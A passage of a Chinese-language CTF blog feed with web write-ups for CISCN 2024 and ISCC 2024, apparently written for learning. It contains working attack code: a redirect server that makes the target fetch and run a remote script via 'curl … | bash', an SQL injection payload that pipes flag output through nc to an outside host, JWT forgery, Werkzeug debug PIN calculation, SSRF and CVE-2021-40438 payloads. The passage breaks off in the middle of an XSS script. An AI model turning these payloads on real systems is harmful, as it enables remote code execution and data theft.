src="/../../../images/ciscn2024/cms3.png" alt="cms3"></p><p>定位了thumb，有curl的，需要传内容，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://127.0.0.1/flag.php<br></code></pre></td></tr></table></figure><p>随便传点内容，试了不行需要，要用302跳转打内网</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># 重定向到带有反向shell命令的URL</span><br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;http://127.0.0.1/flag.php?cmd=curl%20http%3A%2F%2F8.130.42.113%3A5566%2Fttt%7Cbash&quot;</span>)<br><span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-string">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>传到linux服务器上面，python3开启httpserver到port上，打开flask服务，然后将thumb改为我们的<a href="http://vps_ip:flask端口上">http://vps_ip:flask端口上</a></p><p>然后nc监听另外一个端口（需要弹shell的</p><p>但是我始终没谈的起来，不明白是不是ctfshow的原因，大概的流程是如此</p><p>用php写也可以。这题只做个记录。</p><p>大概流程就是写个代码开端口a，用php环境开端口b，用hackbar发包改为服务器302重定向路径b,最后开nc监听端口a，在&#x2F;readflag里面有。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2024回顾</title>
    <link href="/2024/05/26/iscc/iscc2024/"/>
    <url>/2024/05/26/iscc/iscc2024/</url>
    
    <content type="html"><![CDATA[<p>前言:虽然是人脉顿悟赛，归根结底还是要总结一下，因为这个比赛好久没有认真学习了，先把这篇写完吧，只看web部分。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="还没想好名字的塔防游戏"><a href="#还没想好名字的塔防游戏" class="headerlink" title="还没想好名字的塔防游戏"></a>还没想好名字的塔防游戏</h3><p>这题写的时候其实没有思路的，按照往常的web游戏思路都是改js就行或者玩到底，很多师傅玩的时候还是挺久的。</p><p>先按正常思路看源码搜alert</p><p><img src="/../../images/iscc2024/%E6%B8%B8%E6%88%8F1.png" alt="游戏1"></p><p>看这个以为是什么小说要社工，其实完全想法反了，再上一个图片</p><p><img src="/../../images/iscc2024/%E6%B8%B8%E6%88%8F.png" alt="游戏"></p><p>还有题目的提示  <strong>Flag格式为ISCC{xxx}，其中xxx共有18位，记得数清楚哦！</strong></p><p>仔细研究一下并不是所有的单词首字母都是大写，最后的flag其实就是游戏加提示开头字母大写的拼接起来。应该是ISCC{MDWTSGTMMCCSITTDWS}，也是记上一种新的游戏web了</p><h3 id="Flask中的pin值计算"><a href="#Flask中的pin值计算" class="headerlink" title="Flask中的pin值计算"></a>Flask中的pin值计算</h3><p>这题写的时候后来又刷到pin的时候，小记录了一点，这边也简要写一下吧，后面打算写个pin的总结。</p><p>先上个图片</p><p><img src="/../../images/iscc2024/flaskpin.png" alt="游戏1"></p><p>首先也是看源码吧，没有靶机了，可以看出来是base64，解一下密码是&#x2F;getusername，来到下面的页面，看到海螺其实想到哪个比赛的那个神奇的海螺，考察的知识点是ssit模板注入，看一下这一个页面并不是flask，挨个尝试输入app.py可以得到下面这个图</p><p><img src="/../../images/iscc2024/pin1.png" alt="pin1"></p><p>告诉我username， 输入这个会有回显pincalculate，那就是典型的算pin值的了。</p><p><img src="/../../images/iscc2024/pinu.png" alt="pinu"></p><p>进入crawler这个页面，是一个动态实时的数学计算题目，可以写一个脚本爬一下及时的答题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># 发送GET请求获取数学表达式</span><br>response = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/get_expression&quot;</span>)<br><span class="hljs-comment"># 如果请求成功</span><br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-comment"># 提取数学表达式</span><br>    expression = response.json()[<span class="hljs-string">&#x27;expression&#x27;</span>]<br>    <span class="hljs-comment"># 计算表达式的结果</span><br>    result = <span class="hljs-built_in">eval</span>(expression)<br>    <span class="hljs-comment"># 打印计算结果</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;计算结果:&quot;</span>, result)<br>    <span class="hljs-comment"># 将结果发送到网站</span><br>    response = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:10006/crawler?answer=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(result))<br>    <span class="hljs-comment"># 打印网站返回的响应内容</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;网站返回的响应:&quot;</span>, response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 如果请求失败，打印错误信息</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取数学表达式失败，状态码:&quot;</span>, response.status_code)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/pin2.png" alt="pin2"></p><p>知道了flask使用的版本以及uuidnode位于的地方。</p><p>进到&#x2F;woddenfish的界面，敲了一会我是没敲出个所以然，看看源码给了提示是ISCC_muyu_2024。</p><p><a href="https://jwt.io/#debugger-io">JSON Web Tokens - jwt.io</a>这个网站改改吧，我好像是非预期，莫名其妙的bp点几下就进去了，应该是要根据这个改的进去之后</p><p><img src="/../../images/iscc2024/pin3.png" alt="pin3"></p><p>是这个样子，Unicode解密02:42:ac:18:00:02给了地址，接着去看machine_id</p><p>下面的一个界面我也没截图，大概就是一个俱乐部的界面吧也是需要用脚本跑的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">![pin4](../../images/iscc2024/pin4.png)<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps<br><span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">topic</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br>    [header, payload, signature] = topic.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    parsed_payload = loads(base64url_decode(payload))<br>    parsed_payload[<span class="hljs-string">&#x27;role&#x27;</span>] = <span class="hljs-string">&quot;vip&quot;</span><br>    fake_payload = base64url_encode(<br>        (dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake_payload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br>originaltoken = <span class="hljs-string">&#x27;&#x27;&#x27;这里面是页面的&#x27;&#x27;&#x27;</span><br>topic = topic(originaltoken)<br><span class="hljs-built_in">print</span>(topic)<br><br></code></pre></td></tr></table></figure><p>要给jwt一个验证带入跑一下就行。</p><p><img src="/../../images/iscc2024/pin4.png" alt="pin4"></p><p>得到supervip的key用GitHub脚本可以直接出，自己clone就行</p><p><img src="/../../images/iscc2024/pin5.png" alt="pin5"></p><p>之后伪造一下就行了</p><p><img src="/../../images/iscc2024/pin6.png" alt="pin6"></p><p>这样所有的数据就得到了，这里注意版本啊，劳累我交wp还把版本的交错了高版本sha1，低版本md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">#/etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment">#默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment">#默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.11/site-packages/flask/app.py&#x27;</span><span class="hljs-comment">#moddir，报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;&#x27;</span>,/sys/<span class="hljs-keyword">class</span>/net/eth0/address 十进制<br>    <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment">#看上面machine-id部分</span><br>]<br><br><span class="hljs-comment"># 下面为源码里面抄的，不需要修改</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>最后再console里面交一下pin码就出答案了。</p><h3 id="与时俱进"><a href="#与时俱进" class="headerlink" title="与时俱进"></a>与时俱进</h3><p>这题没写，最后的顿悟的太厉害了，我估摸着我跟着顿悟wp说不定还没交上，看起来也挺难的，如有有空再说吧，</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>这题是原题啊[<a href="https://blog.csdn.net/qq_45837896/article/details/126026576#De1CTF_2019SSRF_Me_2">De1CTF 2019]SSRF Me</a>，跟着走一遍吧。下面是源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /usr/bin/env python</span><br><span class="hljs-comment"># #encoding=utf-8</span><br>from flask import Flask<br>from flask import request<br>import socket<br>import hashlib<br>import urllib<br>import sys<br>import os<br>import json<br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br> <br>app = Flask(__name__)<br> <br>secert_key = os.urandom(16)<br> <br>class Task:<br>    def __init__(self, action, param, sign, ip):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(not os.path.exists(self.sandbox)):<br>            os.mkdir(self.sandbox)<br> <br>    def Exec(self):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = 500<br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = 200<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = open(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = 200<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == 500:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = 500<br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-built_in">return</span> result<br> <br>    def checkSign(self):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-built_in">return</span> True<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">return</span> False<br> <br>@app.route(<span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def geneSign():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-built_in">return</span> getSign(action, param)<br> <br>@app.route(<span class="hljs-string">&#x27;/De1ta&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def challenge():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-built_in">return</span> json.dumps(task.Exec())<br> <br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def index():<br>    <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;code.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).<span class="hljs-built_in">read</span>()<br> <br>def scan(param):<br>    socket.setdefaulttimeout(1)<br>    try:<br>        <span class="hljs-built_in">return</span> urllib.urlopen(param).<span class="hljs-built_in">read</span>()[:50]<br>    except:<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br> <br>def getSign(action, param):<br>    <span class="hljs-built_in">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br> <br>def md5(content):<br>    <span class="hljs-built_in">return</span> hashlib.md5(content).hexdigest()<br> <br>def waf(param):<br>    check=param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) or check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-built_in">return</span> True<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">return</span> False<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = False<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=9999)<br></code></pre></td></tr></table></figure><p>定位到关键代码</p><p>有三个路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&#x27;/&#x27;</span><br><span class="hljs-string">&#x27;/De1ta&#x27;</span><br><span class="hljs-string">&#x27;/geneSign&#x27;</span><br></code></pre></td></tr></table></figure><p>好懒累了，具体逻辑看原题吧我就说一下思路</p><p>使用if的判断</p><p>可以尝试用readscan绕过</p><p>param放要读的文件flag.txt</p><p>cookie里的action+GET里的param加密后要等于cookie里的sign</p><p>geneSign告诉我们param+关键字action的MD5加密是多少</p><p>那我们在&#x2F;geneSign页面传param&#x3D;flag.txtread就能算出来secret_key+flag.txt+readscan的值是多少，可以绕过弱比较</p><p>先获得sign的值</p><p>最终，回到<code>/De1ta</code>页面，<code>GET</code>传参<code>param=flag.txt</code>，<code>cookie</code>传参</p><p><img src="/../../images/iscc2024/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.png" alt="代码审计"></p><h3 id="原神启动"><a href="#原神启动" class="headerlink" title="原神启动"></a>原神启动</h3><p>我们原神玩家也是出息了。</p><p>作为一个op能直接答题那还是看一下源码吧，与熊论禅</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E.png" alt="原神"></p><p>就是简单的答题，输入正确答案可以问问题，尝试输入flag，告诉我们在flag.txt</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E1.png" alt="原神1"></p><p>以为直接是flag的，交完之后也不对啊。尝试扫了一下，并没有发现有什么异端，挨个进入，发现<a href="http://101.200.138.180:8080/index.jsp%EF%BC%8C%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%98%BE%E7%A4%BA%E6%98%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7%EF%BC%8C%E6%90%9C%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89cve">http://101.200.138.180:8080/index.jsp，里面可以显示是服务器的版本号，搜看看有没有cve</a></p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E2.png" alt="原神2"></p><p>有漏洞可以利用，我们在虚拟机运行利用漏洞读取得到flag</p><p><img src="/../../images/iscc2024/%E5%8E%9F%E7%A5%9E3.png" alt="原神3"></p><h3 id="掉进阿帕奇的工资"><a href="#掉进阿帕奇的工资" class="headerlink" title="掉进阿帕奇的工资"></a>掉进阿帕奇的工资</h3><p>这题也难也是劳累</p><p>进入的页面是登陆界面，尝试用admin爆破密码进去的，爆破好久也是没进去，那就只能注册一个账号看看了。</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%87.png" alt="阿帕奇"></p><p>？看看源码。</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%871.png" alt="阿帕奇1"></p><p>还是学生就遭受了社会的毒打，要求是应该要是manager才能进入的啊</p><p>总结其实也不用改bp，就是页面注册的时候把信息都填好，验证问题选择第二个，然后修改密码选择回答问题，之后就可以登陆了</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%872.png" alt="阿帕奇2"></p><p>进去就是一个界面。</p><p>在工资界面上尝试一会好像是异或，输入ls和]B，可以爆出所有的内容</p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%873.png" alt="阿帕奇3"></p><p>把所有的挨个试一下，结果应该是在Docfile </p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%874.png" alt="阿帕奇4"></p><p>一开始非预期可以直接用异或出的，环境修复之后就不行了，这题也考察的cve漏洞</p><p><a href="https://blog.csdn.net/qq_51398553/article/details/131299190">CVE-2021-40438</a>，按照流程也是最后出flag的</p><p>构造transfer.php?dashachun&#x3D;unix:A……A|<a href="http://secret.host/flag%E5%BE%97%E5%88%B0flag">http://secret.host/flag得到flag</a></p><p><img src="/../../images/iscc2024/%E9%98%BF%E5%B8%95%E5%A5%875.png" alt="阿帕奇5"></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><p>这种全考反弹shell我i也是无奈了，最后的服务器环境也一直在爆，哎。</p><h3 id="这题我出不了了"><a href="#这题我出不了了" class="headerlink" title="这题我出不了了"></a>这题我出不了了</h3><p>这题我也真的出不了啊</p><p><a href="https://over-rainbow.cn/posts/2017-hitcon-sql-so-hard/">原题</a>，跟着过一遍吧，原理看文章就行</p><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># payload = &quot;union&quot;</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;&#x27;,&#x27;&#x27;)/*%s*/returning(1)as&quot;\\&#x27;/*&quot;,(1)as&quot;\\&#x27;*/-(a=`child_process`)/*&quot;,(2)as&quot;\\&#x27;*/-(b=`/printFlag|nc 47.122.22.16 5566`)/*&quot;,(3)as&quot;\\&#x27;*/-console.log(process.mainModule.require(a).exec(b))]=1//&quot;--&quot;&quot;&quot;</span> % (<span class="hljs-string">&#x27; &#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">16</span>)<br>username = <span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))<br>data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: username+payload,<br>                <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;AAAAAA&#x27;</span><br>                &#125;<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br>r = requests.post(<span class="hljs-string">&#x27;http://101.200.138.180:32031/register_7D85tmEhhAdgGu92&#x27;</span>, data=data)<br><span class="hljs-built_in">print</span>(r.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br></code></pre></td></tr></table></figure><p>在跑的时候要多连几下，可能连不起来，自己要买台云服务器方便一点，根据实际情况来</p><p><img src="/../../images/iscc2024/%E5%87%BA%E4%B8%8D%E4%BA%86.png" alt="出不了"></p><h3 id="一道普通的XSS题目"><a href="#一道普通的XSS题目" class="headerlink" title="一道普通的XSS题目"></a>一道普通的XSS题目</h3><p>显然这也并不简单,这是一道国际赛的原题，当时还是爆零了，我们也借鉴借鉴</p><p><a href="https://blog.ankursundara.com/dicectf23-writeups/">文章</a>，对比原文可以看出基本没有变化，也是跟着思路来一遍吧(这不就是炒冷饭，我太失败了)</p><p>改一下脚本，改个vps和端口，然后用node.js跑一下就可以了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">xmls = <span class="hljs-string">`&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span 